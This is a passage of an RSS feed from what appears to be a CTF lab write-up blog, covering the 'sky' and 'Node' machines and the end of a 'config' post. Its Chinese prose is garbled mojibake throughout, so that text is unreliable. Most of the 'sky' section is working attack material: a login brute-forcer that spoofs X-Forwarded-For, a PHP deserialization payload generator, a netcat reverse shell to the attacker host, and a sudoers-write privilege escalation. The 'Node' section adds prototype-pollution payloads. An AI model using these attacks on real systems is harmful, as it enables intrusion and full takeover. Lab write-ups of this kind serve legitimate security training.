ÊâßË°åÂêéÔºåNginx ‰ºöÂú®ÂêéÂè∞‰ª• `root` Ë∫´‰ªΩÂêØÂä®‰∏Ä‰∏™ÁõëÂê¨ 8081 Á´ØÂè£ÁöÑ Web ÊúçÂä°ÔºåËØ•ÊúçÂä°‰ºöÂ∞Ü `/root` ÁõÆÂΩïÁöÑÂÜÖÂÆπÊö¥Èú≤Âá∫Êù•„ÄÇ

# **Âõõ„ÄÅÂ§∫ÂèñÊóóÂ∏ú**

ÂõûÂà∞ÊîªÂáªÊú∫Ôºå‰ΩøÁî® `curl` ËÆøÈóÆÁõÆÊ†áÈù∂Êú∫ `192.168.205.241` ÁöÑ 8081 Á´ØÂè£„ÄÇ

È¶ñÂÖàÔºåËÆøÈóÆ `/files/` Ë∑ØÂæÑÔºåÁî±‰∫éÂºÄÂêØ‰∫Ü `autoindex`ÔºåÊúçÂä°Âô®‰ºöÂàóÂá∫ `/root` ÁõÆÂΩï‰∏ãÁöÑÊâÄÊúâÊñá‰ª∂„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl http://192.168.205.241:8081/files/
&lt;html&gt;
&lt;head&gt;&lt;title&gt;Index of /files/&lt;/title&gt;&lt;/head&gt;
&lt;body&gt;
&lt;h1&gt;Index of /files/&lt;/h1&gt;&lt;hr&gt;&lt;pre&gt;&lt;a href='../'&gt;../&lt;/a&gt;
&lt;a href='root.txt'&gt;root.txt&lt;/a&gt;                                           05-Jul-2025 03:54                  48
&lt;/pre&gt;&lt;hr&gt;&lt;/body&gt;
&lt;/html&gt;
```

Âú®ÂàóË°®‰∏≠Êàë‰ª¨ÁúãÂà∞‰∫Ü `root.txt` Êñá‰ª∂„ÄÇÊé•ÁùÄÁõ¥Êé•ËØªÂèñËØ•Êñá‰ª∂ÔºåËé∑ÂæóÊúÄÁªàÁöÑ root flag„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ curl http://192.168.205.241:8081/files/root.txt
flag{root-bf116e68-5953-11f0-b06c-63e27ce93d04}
```

Ëá≥Ê≠§Ôºåuser Âíå root ‰∏§‰∏™ flag ÂùáÂ∑≤Ëé∑ÂèñÔºåÊ∏óÈÄèÊµãËØïÂÆåÊàê„ÄÇsentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_config.html</guid><pubDate>Wed, 06 Aug 2025 00:49:16 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_sky</title><link>https://7r1UMPHK.github.io/post/nei-bu-_sky.html</link><description>![image-20250728205701542](http://7r1UMPHK.github.io/image/20250728205701809.webp)

# ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ

## 1. ‰∏ªÊú∫ÂèëÁé∞

‰ΩøÁî® `arp-scan` Êâ´ÊèèÊú¨Âú∞ÁΩëÁªúÔºåÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫ IP Âú∞ÂùÄ‰∏∫ `192.168.205.230`„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
‚îî‚îÄ$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.230 08:00:27:03:0e:34       PCS Systemtechnik GmbH
...
```

## 2. Á´ØÂè£‰∏éÊúçÂä°Êâ´Êèè

‰ΩøÁî® `nmap` ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÂÖ®Á´ØÂè£Êâ´ÊèèÔºåÂèëÁé∞ÂÖ∂ÂºÄÊîæ‰∫Ü 22 (SSH) Âíå 80 (HTTP) Á´ØÂè£

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
‚îî‚îÄ$ nmap -p- 192.168.205.230
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-28 08:58 EDT
Nmap scan report for 192.168.205.230
Host is up (0.00016s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:03:0E:34 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

## 3. Web ÁõÆÂΩïÊûö‰∏æ

‰ΩøÁî® `gobuster` ÂØπ Web ÊúçÂä°ËøõË°åÁõÆÂΩïÁàÜÁ†¥ÔºåÂèëÁé∞Â§ö‰∏™ PHP Êñá‰ª∂ÔºåÂåÖÊã¨ `login.php`, `check.php`, `secret.php` Á≠âÂÖ≥ÈîÆÈ°µÈù¢„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
‚îî‚îÄ$ gobuster dir -u http://192.168.205.230 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,txt,html
===============================================================
[+] Url:                     http://192.168.205.230
...
/index.html           (Status: 200)
/login.php            (Status: 200)
/logout.php           (Status: 302) --&gt; login.php
/check.php            (Status: 200)
/ok.php               (Status: 302) --&gt; login.php
/secret.php           (Status: 200)
...
===============================================================
```

# ‰∫å„ÄÅÂàùÂßãËÆøÈóÆ

## Web Ê∏óÈÄè (Port 80)

### 1. ÁôªÂΩïÁªïËøá‰∏éÁàÜÁ†¥

ËÆøÈóÆ `http://192.168.205.230`ÔºåËøõÂÖ•‰∏Ä‰∏™ÁôªÂΩïÈ°µÈù¢„ÄÇ`secret.php` È°µÈù¢ÊèêÁ§∫‚ÄúÂ§ßÈó®‰ºº‰πéÊó†Ê≥ïË¢´Êö¥ÂäõÊâìÂºÄ‚ÄùÔºåÊöóÁ§∫ÂèØËÉΩÂ≠òÂú®Èò≤ÁàÜÁ†¥Êú∫Âà∂„ÄÇ

ÁªèËøáÊµãËØïÔºåÂèëÁé∞ÁôªÂΩïÈ™åËØÅÊé•Âè£ `check.php` Â≠òÂú® CSRF Token Ê†°È™åÔºåÂπ∂‰∏îÊúâÂü∫‰∫é IP ÁöÑÁôªÂΩïÂ∞ùËØïÈôêÂà∂„ÄÇÈÄöËøáÂú® HTTP ËØ∑Ê±ÇÂ§¥‰∏≠‰º™ÈÄ† `X-Forwarded-For` Â≠óÊÆµÔºåÂèØ‰ª•ÁªïËøáÊ≠§ IP ÈôêÂà∂„ÄÇ

ÁºñÂÜô Python ËÑöÊú¨ÔºåÂú®ÊØèÊ¨°Â∞ùËØïÂØÜÁ†ÅÂâçÈÉΩÂÖàËØ∑Ê±ÇÁôªÂΩïÈ°µËé∑ÂèñÊñ∞ÁöÑ CSRF TokenÔºåÂπ∂‰º™ÈÄ†Êù•Ê∫ê IPÔºåÊàêÂäüÁàÜÁ†¥Âá∫ `admin` Áî®Êà∑ÁöÑÂØÜÁ†Å‰∏∫ `superman1`„ÄÇ

**ÊîªÂáªËÑöÊú¨**

```python
import requests
import re
from time import sleep
from random import randint

LOGIN_URL = 'http://192.168.205.230/login.php'
CHECK_URL = 'http://192.168.205.230/check.php'
USERNAME = 'admin'
PASSWORD_LIST_PATH = '/usr/share/wordlists/rockyou.txt'

def gen_ip():
    return f'{randint(1,255)}.{randint(1,255)}.{randint(1,255)}.{randint(1,255)}'

def main():
    print('--- ÂºÄÂßãÊîªÂáª ---')
    print(f'[*] ÁõÆÊ†áURL: {CHECK_URL}')
    print(f'[*] Áî®Êà∑Âêç: {USERNAME}')
    print(f'[*] ÂØÜÁ†ÅÂ≠óÂÖ∏: {PASSWORD_LIST_PATH}')
    print('-' * 20)

    session = requests.Session()

    try:
        with open(PASSWORD_LIST_PATH, 'r', encoding='latin-1') as f:
            for pwd in f:
                pwd = pwd.strip()
                if not pwd:
                    continue

                try:
                    ip = gen_ip()
                    headers = {
                        'X-Forwarded-For': ip,
                        'X-Originating-IP': ip,
                        'X-Remote-IP': ip,
                        'X-Remote-Addr': ip
                    }
                    
                    print(f'[*] Ê≠£Âú®‰∏∫ÂØÜÁ†Å '{pwd}' Ëé∑ÂèñÊñ∞Token... (IP: {ip})')
                    r = session.get(LOGIN_URL, headers=headers)
                    token_match = re.search(r'id='csrfToken' value='([a-f0-9]{16})'', r.text)
                    if not token_match:
                        print('[!] Êó†Ê≥ïËé∑ÂèñTokenÔºåÂèØËÉΩË¢´Â∞ÅIPÊàñÈ°µÈù¢ÂèòÊõ¥„ÄÇ')
                        break

                    token = token_match.group(1)
                    print(f'[*] Ëé∑ÂèñÊàêÂäü, Token: {token}')

                    data = {
                        'username': USERNAME,
                        'password': pwd,
                        'csrf_token': token
                    }

                    res = session.post(CHECK_URL, data=data, headers=headers)
                    print(f'[*] Ê≠£Âú®Â∞ùËØïÂØÜÁ†Å: {pwd}')

                    if 'ÂØÜÁ†ÅÈîôËØØ' not in res.text and 'Áî®Êà∑ÂêçÈîôËØØ' not in res.text and 'ÁôªÂΩïÂ∞ùËØïÊ¨°Êï∞ËøáÂ§ö' not in res.text:
                        print('\n' + '='*40)
                        print(f'[+] !!! ÊîªÂáªÊàêÂäü !!!')
                        print(f'[+] Áî®Êà∑Âêç: {USERNAME}')
                        print(f'[+] ÂØÜÁ†Å: {pwd}')
                        print(f'[+] ÂìçÂ∫îÂÜÖÂÆπ: {res.text}')
                        print('='*40)
                        return

                    if 'Áî®Êà∑ÂêçÈîôËØØ' in res.text:
                        print('[!] Áî®Êà∑ÂêçÈîôËØØÔºåÂÅúÊ≠¢ÁàÜÁ†¥„ÄÇ')
                        return
                        
                    if 'ÁôªÂΩïÂ∞ùËØïÊ¨°Êï∞ËøáÂ§ö' in res.text:
                        print('[!] Ë¥¶Êà∑Ë¢´ÈîÅÂÆöÔºåÁ®çÁ≠â5ÂàÜÈíü...')
                        sleep(300)

                except requests.RequestException as e:
                    print(f'[!] ËØ∑Ê±ÇÂºÇÂ∏∏: {e}')
                    sleep(5)

    except FileNotFoundError:
        print(f'[!] ÂØÜÁ†ÅÂ≠óÂÖ∏Êú™ÊâæÂà∞: {PASSWORD_LIST_PATH}')
    except Exception as e:
        print(f'[!] Êú™Áü•ÈîôËØØ: {e}')

if __name__ == '__main__':
    main()
```

### 2. PHP ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÂà©Áî®

![image-20250728210931335](http://7r1UMPHK.github.io/image/20250728210932754.webp)

ÊàêÂäüÁôªÂΩïÂêéÔºåÂèëÁé∞ `ok.php` È°µÈù¢Â≠òÂú® PHP ÂèçÂ∫èÂàóÂåñÊºèÊ¥ûÔºåÂÖ∂‰ª£Á†ÅÂ¶Ç‰∏ãÔºö

```php
if (isset($_GET['data'])) {
    $data = $_GET['data'];
    unserialize($data);
}
```

`unserialize` ÂáΩÊï∞ÁöÑÂèÇÊï∞Áõ¥Êé•ÂèñËá™ GET ËØ∑Ê±ÇÔºåÂ≠òÂú®‰∏•ÈáçÂÆâÂÖ®È£éÈô©„ÄÇÈÄöËøáÂàÜÊûêÂ∫îÁî®Á®ãÂ∫èÁöÑÁ±ªÔºà`UserSession`, `CacheManager`, `FileHandler`, `SystemExecutor`ÔºâÔºåÂèØ‰ª•ÊûÑÈÄ†‰∏ÄÊù° POP (Property-Oriented Programming) ÈìæÔºåÊúÄÁªàÂÆûÁé∞ËøúÁ®ã‰ª£Á†ÅÊâßË°å„ÄÇ

**POP ÈìæÂà©Áî®ÊÄùË∑ØÔºö**
`UserSession` -&gt; `CacheManager` -&gt; `FileHandler` -&gt; `SystemExecutor`

ÈÄöËøáÊ≠§ÈìæÊù°ÔºåÊúÄÁªà‰ºöËß¶Âèë `SystemExecutor` Á±ª‰∏≠ÁöÑ `__destruct` ÊñπÊ≥ïÊâßË°åÁ≥ªÁªüÂëΩ‰ª§„ÄÇ

**Payload ÁîüÊàêËÑöÊú¨:**

```python
import urllib.parse

class SystemExecutor: pass
class FileHandler: __init__ = lambda s,p,f: setattr(s,'process',p) or setattr(s,'filename',f)
class CacheManager: __init__ = lambda s,c: setattr(s,'cacheFile',c)
class UserSession: __init__ = lambda s,l: setattr(s,'logger',l)

def php_ser(obj):
    if isinstance(obj, str):
        return f's:{len(obj)}:'{obj}';'
    if isinstance(obj, SystemExecutor):
        return 'O:14:'SystemExecutor':0:{}'
    if isinstance(obj, FileHandler):
        d = php_ser('process')+php_ser(obj.process)
        d += php_ser('filename')+php_ser(obj.filename)
        return f'O:11:'FileHandler':2:{{{d}}}'
    if isinstance(obj, CacheManager):
        d = php_ser('cacheFile')+php_ser(obj.cacheFile)
        return f'O:12:'CacheManager':1:{{{d}}}'
    if isinstance(obj, UserSession):
        d = php_ser('logger')+php_ser(obj.logger)
        return f'O:11:'UserSession':1:{{{d}}}'
    return 'N;'

def g():
    c = input('ËæìÂÖ•ÂëΩ‰ª§: ').strip()
    e = SystemExecutor()
    f = FileHandler(e, c)
    cm = CacheManager(f)
    us = UserSession(cm)
    p = php_ser(us)
    u = f'http://192.168.205.230/ok.php?data={urllib.parse.quote(p)}'
    print(f'[*] Â∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤:\n{p}\n')
    print(f'[*] ÊîªÂáªURL:\n{u}')

if __name__ == '__main__':
    g()
```

Â∞ùËØïÂà©Áî®

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ python3 b.py
ËæìÂÖ•ÂëΩ‰ª§: id
[*] Â∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤:
O:11:'UserSession':1:{s:6:'logger';O:12:'CacheManager':1:{s:9:'cacheFile';O:11:'FileHandler':2:{s:7:'process';O:14:'SystemExecutor':0:{}s:8:'filename';s:2:'id';}}}

[*] ÊîªÂáªURL:
http://192.168.205.230/ok.php?data=O%3A11%3A%22UserSession%22%3A1%3A%7Bs%3A6%3A%22logger%22%3BO%3A12%3A%22CacheManager%22%3A1%3A%7Bs%3A9%3A%22cacheFile%22%3BO%3A11%3A%22FileHandler%22%3A2%3A%7Bs%3A7%3A%22process%22%3BO%3A14%3A%22SystemExecutor%22%3A0%3A%7B%7Ds%3A8%3A%22filename%22%3Bs%3A2%3A%22id%22%3B%7D%7D%7D
```

ÂéªwebÁúã‰∫Ü‰∏Ä‰∏ãÔºåËøîÂõû‰∫ÜgoodÔºåÈÇ£Âºπshell

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x/tmp]
‚îî‚îÄ$ python3 b.py
ËæìÂÖ•ÂëΩ‰ª§: busybox nc 192.168.205.128 8888 -e /bin/bash
[*] Â∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤:
O:11:'UserSession':1:{s:6:'logger';O:12:'CacheManager':1:{s:9:'cacheFile';O:11:'FileHandler':2:{s:7:'process';O:14:'SystemExecutor':0:{}s:8:'filename';s:44:'busybox nc 192.168.205.128 8888 -e /bin/bash';}}}

[*] ÊîªÂáªURL:
http://192.168.205.230/ok.php?data=O%3A11%3A%22UserSession%22%3A1%3A%7Bs%3A6%3A%22logger%22%3BO%3A12%3A%22CacheManager%22%3A1%3A%7Bs%3A9%3A%22cacheFile%22%3BO%3A11%3A%22FileHandler%22%3A2%3A%7Bs%3A7%3A%22process%22%3BO%3A14%3A%22SystemExecutor%22%3A0%3A%7B%7Ds%3A8%3A%22filename%22%3Bs%3A44%3A%22busybox%20nc%20192.168.205.128%208888%20-e%20/bin/bash%22%3B%7D%7D%7D
```

Âú®Êú¨Âú∞‰ΩøÁî® `netcat` ÂºÄÂêØÁõëÂê¨ÔºåÁÑ∂ÂêéËÆøÈóÆÊûÑÈÄ†Â•ΩÁöÑ URLÔºåÊàêÂäüÊé•Êî∂Âà∞ `www-data` Áî®Êà∑ÁöÑÂèçÂºπ shell„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nc -lvnp 8888           
listening on [any] 8888 ...
connect to [192.168.205.128] from (UNKNOWN) [192.168.205.230] 55154
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

# ‰∏â„ÄÅÊùÉÈôêÊèêÂçá

## 1. ‰ªé `www-data` Âà∞ `sky`

Âú® `www-data` Áî®Êà∑ÁöÑ shell ‰∏≠Ôºå‰∫éÁΩëÁ´ôÊ†πÁõÆÂΩï `/var/www/html` ‰∏ãÂèëÁé∞‰∏Ä‰∏™Âêç‰∏∫ `ll1045670921.php` ÁöÑÂèØÁñëÊñá‰ª∂„ÄÇÊü•ÁúãÂÖ∂ÂÜÖÂÆπÔºåËé∑Âæó‰∫Ü‰∏Ä‰∏™ÂØÜÈí•/ÂØÜÁ†ÅÔºö`bf4e842c9fea1b77`„ÄÇ

```bash
www-data@sky:/var/www/html$ cat ll1045670921.php
&lt;?php
...
// ÁúãÊù•‰Ω†ÊâæÂà∞‰∫ÜÈÄöÂæÄÂ§©Á©∫ÁöÑÂØÜÈí•Ôºöbf4e842c9fea1b77
?&gt;
```

ÈÄöËøá `ls /home` ÂèëÁé∞Â≠òÂú®Áî®Êà∑ `sky`„ÄÇ‰ΩøÁî®ËØ•ÂØÜÈí•‰Ωú‰∏∫ÂØÜÁ†ÅÔºåÊàêÂäüÂàáÊç¢Âà∞ `sky` Áî®Êà∑ÔºåÂπ∂ËØªÂèñÂà∞Á¨¨‰∏Ä‰∏™ flag„ÄÇ

```bash
www-data@sky:/var/www/html$ su sky
Password: &lt;Âú®Ê≠§ËæìÂÖ•ÂØÜÈí•&gt;
sky@sky:/var/www/html$ cd
sky@sky:~$ cat user.txt
# ÊÅ≠Âñú‰Ω†ÔºåÊâæÂà∞‰∫ÜÁ¨¨‰∏Ä‰∏™ÂõΩÁéãÁßòÂÆù
flag{user-TheNineHeavensBlackMagicScroll}
```

## 2. ‰ªé `sky` Âà∞ `root` (`git-dumper` ÊèêÊùÉ)

‰ΩøÁî® `sudo -l` ÂëΩ‰ª§Ê£ÄÊü• `sky` Áî®Êà∑ÁöÑÊùÉÈôêÔºåÂèëÁé∞ËØ•Áî®Êà∑ÂèØ‰ª•Êó†ÂØÜÁ†ÅÊâßË°å `/usr/local/bin/git-dumper` ÂëΩ‰ª§„ÄÇ

```bash
sky@sky:~$ sudo -l
...
User sky may run the following commands on sky:
    (ALL) NOPASSWD: /usr/local/bin/git-dumper
```

`git-dumper` Â∑•ÂÖ∑Áî®‰∫é‰ªéÁΩëÁ´ô‰∏ãËΩΩÊö¥Èú≤ÁöÑ `.git` ‰ªìÂ∫ì„ÄÇÂÖ∂Êé•Âèó‰∏§‰∏™‰∏ªË¶ÅÂèÇÊï∞ÔºöÊ∫ê URL ÂíåËæìÂá∫ÁõÆÂΩï„ÄÇÁî±‰∫é `sudo` ÂÖÅËÆ∏‰ª• root Ë∫´‰ªΩËøêË°åÊ≠§Á®ãÂ∫èÔºåÂπ∂‰∏îÂèØ‰ª•ÊåáÂÆö‰ªªÊÑèËæìÂá∫ÁõÆÂΩïÔºåËøô‰æøÊûÑÊàê‰∫Ü‰∏Ä‰∏™ÂÖ∏ÂûãÁöÑ**‰ªªÊÑèÊñá‰ª∂ÂÜôÂÖ•**ÊºèÊ¥û„ÄÇ Êàë‰ª¨ÂèØ‰ª•Âà©Áî®Ê≠§ÊºèÊ¥ûÂêë `/etc/sudoers.d/` ÁõÆÂΩïÂÜôÂÖ•‰∏Ä‰∏™Ëá™ÂÆö‰πâÁöÑ sudoers ÈÖçÁΩÆÊñá‰ª∂Ôºå‰ªéËÄå‰∏∫ `sky` Áî®Êà∑Êéà‰∫àÂÆåÂÖ®ÁöÑ root ÊùÉÈôê„ÄÇ

**ÊîªÂáªÊ≠•È™§Ôºö**

1.  **Âú®ÊîªÂáªÊú∫ (Kali) ‰∏äÂàõÂª∫ÊÅ∂ÊÑè git ‰ªìÂ∫ìÔºö**
    *   ÂàõÂª∫‰∏Ä‰∏™Êñ∞ÁõÆÂΩïÂπ∂ÂàùÂßãÂåñ‰∏∫ git ‰ªìÂ∫ì„ÄÇ
    *   Âú®‰ªìÂ∫ì‰∏≠ÂàõÂª∫‰∏Ä‰∏™Êñá‰ª∂Ôºà‰æãÂ¶Ç `sky_privs`ÔºâÔºåÂÜÖÂÆπ‰∏∫ `sky ALL=(ALL:ALL) NOPASSWD: ALL`„ÄÇ
    *   Â∞ÜÊ≠§Êñá‰ª∂Ê∑ªÂä†Âà∞ git Âπ∂Êèê‰∫§„ÄÇ
    *   Âú®‰ªìÂ∫ìÁõÆÂΩï‰∏ãÂêØÂä®‰∏Ä‰∏™‰∏¥Êó∂ÁöÑ HTTP ÊúçÂä°Âô®„ÄÇ

    ```bash
    # Âú® Kali ‰∏äÊâßË°å
    ‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp]
    ‚îî‚îÄ$ mkdir git_exploit &amp;&amp; cd git_exploit
    ‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp/git_exploit]
    ‚îî‚îÄ$ git init
    ‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp/git_exploit]
    ‚îî‚îÄ$ echo 'sky ALL=(ALL:ALL) NOPASSWD: ALL' &gt; sky_privs
    ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/gitexp]
    ‚îî‚îÄ$ git config user.name 'xxoo'
    ‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/‚Ä¶/gx/x/tmp/gitexp]
    ‚îî‚îÄ$ git config user.email 'xxoo@x.com'
    ‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp/git_exploit]
    ‚îî‚îÄ$ git add sky_privs &amp;&amp; git commit -m 'pwn'
    ‚îå‚îÄ‚îÄ(kali„âøkali)-[/tmp/git_exploit]
    ‚îî‚îÄ$ python3 -m http.server 80

2. **Âú®Èù∂Êú∫‰∏äÂà©Áî® `git-dumper` ÂÜôÂÖ•Êñá‰ª∂Ôºö**

   *   ‰ª• `sky` Áî®Êà∑Ë∫´‰ªΩÔºå‰ΩøÁî® `sudo` ÊâßË°å `git-dumper`„ÄÇ
   *   URL ÊåáÂêëÊîªÂáªÊú∫ÁöÑ HTTP ÊúçÂä°Âô®„ÄÇ
   *   ËæìÂá∫ÁõÆÂΩïÊåáÂÆö‰∏∫ `/etc/sudoers.d/`„ÄÇ`git-dumper` ‰ºöÂ∞Ü‰ªìÂ∫ì‰∏≠ÁöÑÊñá‰ª∂ÊÅ¢Â§çÂà∞ËØ•ÁõÆÂΩï„ÄÇ

   ```bash
   # Âú®Èù∂Êú∫‰∏äÊâßË°å
   sky@sky:~$ sudo /usr/local/bin/git-dumper http://192.168.205.128 /etc/sudoers.d/
   ...
   [-] Running git checkout .
   Updated 1 path from the index
   ```

3. **È™åËØÅÂπ∂Ëé∑Âèñ Root ShellÔºö**
   ÊâßË°åÊàêÂäüÂêéÔºåÂÜçÊ¨°Ê£ÄÊü• `sudo` ÊùÉÈôêÔºåÂèØ‰ª•ÁúãÂà∞Êñ∞ÁöÑËßÑÂàôÂ∑≤ÁîüÊïà„ÄÇÁé∞Âú®ÂèØ‰ª•Áõ¥Êé•ÂàáÊç¢Âà∞ root Áî®Êà∑„ÄÇ

   ```bash
   sky@sky:~$ sudo -l
   ...
   User sky may run the following commands on sky:
       (ALL) NOPASSWD: /usr/local/bin/git-dumper
       (ALL : ALL) NOPASSWD: ALL   &lt;-- ÊèêÊùÉÊàêÂäüÔºÅ
   
   sky@sky:~$ sudo bash
   root@sky:/home/sky# id
   uid=0(root) gid=0(root) groups=0(root)
   ```

# Âõõ„ÄÅÂ§∫ÂèñÊóóÂ∏ú

Ëé∑Âèñ root ÊùÉÈôêÂêéÔºåËØªÂèñÊâÄÊúâÊóóÂ∏úÊñá‰ª∂„ÄÇ

```bash
root@sky:/home/sky# cat /home/sky/user.txt /root/root.txt 
# ÊÅ≠Âñú‰Ω†ÔºåÊâæÂà∞‰∫ÜÁ¨¨‰∏Ä‰∏™ÂõΩÁéãÁßòÂÆù
flag{user-TheNineHeavensBlackMagicScroll}
# ÊÅ≠Âñú‰Ω†ÔºåÊâæÂà∞‰∫ÜÊúÄÁªàÁöÑÁéãÂõΩÁßòËóè
flag{root-TheSwordoftheSky}
```sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/nei-bu-_sky.html</guid><pubDate>Wed, 06 Aug 2025 00:48:32 +0000</pubDate></item><item><title>ÂÜÖÈÉ®_Node</title><link>https://7r1UMPHK.github.io/post/nei-bu-_Node.html</link><description>ÁúãÂà∞‰∏Ä‰∏™ÊúâÊÑèÊÄùÁöÑÈù∂Êú∫ÔºåÊ∞¥‰∏™wp

ÂÆáÂÆôÂ£∞ÊòéÔºåÂÖ∂‰∏≠Êúâ‰∏Ä‰∫õÁü•ËØÜÁÇπÂèØËÉΩ‰ºöÂá∫Áé∞ÈîôËØØÔºå‰ªãÊÑèÂãøÁúãÔºåÂΩìÁÑ∂‰Ω†ÊúâÊõ¥Â•ΩÁöÑËßÇÁÇπÂèØ‰ª•ÊèêÂá∫Êù•ÔºåÊàëËøõË°å‰øÆÊîπÔºåË∞¢Ë∞¢„ÄÇ
# Èù∂Êú∫Ê∏óÈÄèÊµãËØïÊä•ÂëäÔºöNode

![image-20250726214136966](http://7r1UMPHK.github.io/image/20250727170012871.webp)

## ‰∏Ä„ÄÅ‰ø°ÊÅØÊî∂ÈõÜ

### 1. ‰∏ªÊú∫ÂèëÁé∞

‰ΩøÁî® `arp-scan` Êâ´ÊèèÊú¨Âú∞ÁΩëÁªúÔºåÂèëÁé∞ÁõÆÊ†á‰∏ªÊú∫„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ sudo arp-scan -l
Interface: eth0, type: EN10MB, MAC: 00:0c:29:57:e5:45, IPv4: 192.168.205.128
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
...
192.168.205.223 08:00:27:50:f2:67       PCS Systemtechnik GmbH
...
```

ÁõÆÊ†á‰∏ªÊú∫ IP Âú∞ÂùÄ‰∏∫ `192.168.205.223`„ÄÇ

### 2. Á´ØÂè£‰∏éÊúçÂä°Êâ´Êèè

‰ΩøÁî® `nmap` ÂØπÁõÆÊ†á‰∏ªÊú∫ËøõË°åÁ´ØÂè£Êâ´Êèè„ÄÇ

```bash
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/x]
‚îî‚îÄ$ nmap -p- 192.168.205.223
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-26 09:42 EDT
Nmap scan report for 192.168.205.223
Host is up (0.00013s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3000/tcp open  ppp
MAC Address: 08:00:27:50:F2:67 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
```

Êâ´ÊèèÂèëÁé∞ÂºÄÊîæ‰∫Ü 22 (SSH) Âíå 3000 Á´ØÂè£„ÄÇ3000 Á´ØÂè£ÈÄöÂ∏∏Áî®‰∫é Web ÂºÄÂèëÊúçÂä°„ÄÇ

# ‰∫å„ÄÅÂàùÂßãËÆøÈóÆ

## Web Ê∏óÈÄè (Port 3000)

ËÆøÈóÆ `http://192.168.205.223:3000`ÔºåÂèëÁé∞‰∏Ä‰∏™ Web Â∫îÁî®ÔºåËøôÊòØ‰∏Ä‰∏™Â§öÈò∂ÊÆµÁöÑ Node.js ÂéüÂûãÈìæÊ±°ÊüìÊåëÊàò„ÄÇ

![image-20250726214316960](http://7r1UMPHK.github.io/image/20250727170021649.webp)

ËøôÈáå‰∏§‰∏™Áé©Ê≥ïÔºåÁ¨¨‰∏ÄÁßç‰Ω†Ëøá‰∫ÜÁ¨¨‰∏ÄÈ¢òÔºå‰∏ã‰∏Ä‰∏™FindSomethingÊèí‰ª∂Ôºå‰Ω†‰ºöÂèëÁé∞Êúâ‰∏Ä‰∏™PATH`/admin/flag`Ôºå‰∏ÄÁúãÂ∞±ÊúâÈóÆÈ¢òÂ•ΩÂêßÔºåÈÇ£Èáå‰ºöÁõ¥Êé•Ëé∑ÂæósshÁöÑÁî®Êà∑ÂíåÂØÜÁ†ÅÔºàË¶ÅÂÅö‰∏ÄÈ¢òÊãø‰∏™adminÁöÑcookieÔºâ

Á¨¨‰∫åÁßçÂ∞±ÊòØËÄÅËÄÅÂÆûÂÆûÁöÑ

- **ÂÖ≥Âç° 1: Âü∫Á°ÄÂéüÂûãÊ±°Êüì**

```json
{
  '__proto__': {
    'isAdmin': true
  }
}
```

- **ÂÖ≥Âç° 2: ÁªïËøáÁÆÄÂçïÈò≤Êä§**

```json
{
  'constructor': {
    'prototype': {
      'isAdmin': true
    }
  }
}
```

- **ÂÖ≥Âç° 3: Â§öÂ±ÇÂéüÂûãÊ±°Êüì**

```json
{
  'a': {
    '__proto__': {
      'isAdmin': true
    }
  }
}
```

- **ÂÖ≥Âç° 4: Âä®ÊÄÅÈ™åËØÅÁªïËøá**

```json
{
  'validateAccess': 'function() { return true; }'
}
```

*ps:Ëøô‰∏çÂÉèÂéüÂûãÈìæÊ±°ÊüìÔºåÂèçËÄåÂæàÂÉè‰∏çÂÆâÂÖ®ÂèçÂ∫èÂàóÂåñ*

ÊàêÂäüÂÆåÊàêÊâÄÊúâÂÖ≥Âç°ÂêéÔºåÂ∫îÁî®ËøîÂõûÂá≠ËØÅ‰ø°ÊÅØÔºö

&gt;ÊåëÊàòÊàêÂäü!
&gt;
&gt;‰Ω†ÁöÑFlagÊòØ: **{hungry:imveryhungry}**
&gt;
&gt;ÊÅ≠Âñú‰Ω†ÂÆåÊàê‰∫ÜÊåëÊàòÔºÅ

### SSH ÁôªÂΩï

